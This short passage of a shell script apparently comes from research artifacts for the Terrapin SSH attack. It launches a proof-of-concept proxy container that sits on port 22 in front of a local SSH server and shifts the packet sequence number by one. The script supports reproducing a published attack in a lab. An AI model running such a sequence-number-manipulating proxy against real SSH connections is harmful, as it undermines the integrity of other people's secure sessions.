...
echo "[+] Starting SndIncrease proxy on port 22. Connection will be proxied to 127.0.0.1:2222"
# Start SndIncrease PoC proxy (sequence number will be increased by N = 1)
docker run \
  --rm \
  --network host \
  --name terrapin-artifacts-poc \
  terrapin-artifacts/sqn-snd-increase --server-ip 127.0.0.1 --server-port 2222 -N 1 &
